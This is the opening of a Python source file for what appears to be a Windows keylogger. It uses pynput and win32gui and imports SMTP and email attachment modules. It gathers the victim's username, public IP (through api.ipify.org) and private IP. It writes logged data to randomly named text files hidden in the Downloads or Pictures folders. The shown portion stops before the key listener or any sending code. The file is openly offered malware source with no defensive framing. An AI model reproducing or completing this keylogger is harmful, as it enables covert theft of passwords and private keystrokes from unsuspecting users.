from pynput.keyboard import Key, Listener
import win32gui
import os
import time
import requests
import socket
import random
import smtplib
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
from email.mime.base import MIMEBase
from email import encoders
import threading
import config


datetime = time.ctime(time.time())
user = os.path.expanduser('~').split('\\')[2]
publicIP = requests.get('https://api.ipify.org/').text
privateIP = socket.gethostbyname(socket.gethostname())

msg = f'[START OF LOGS]\n  *~ Date/Time: {datetime}\n  *~ User-Profile: {user}\n  *~ Public-IP: {publicIP}\n  *~ Private-IP: {privateIP}\n\n'
logged_data = []
logged_data.append(msg)

old_app = ''
delete_file = []


def write_file(count):
    one = os.path.expanduser('~') + '/Downloads/'
    two = os.path.expanduser('~') + '/Pictures/'
    # three = 'C:/'
    list = [one, two]

    filepath = random.choice(list)
    filename = str(count) + 'I' + \
        str(random.randint(1000000, 9999999)) + '.txt'
    file = filepath + filename
    delete_file.append(file)

    with open(file, 'w') as fp:
        fp.write(''.join(logged_data))
    print('written all good')
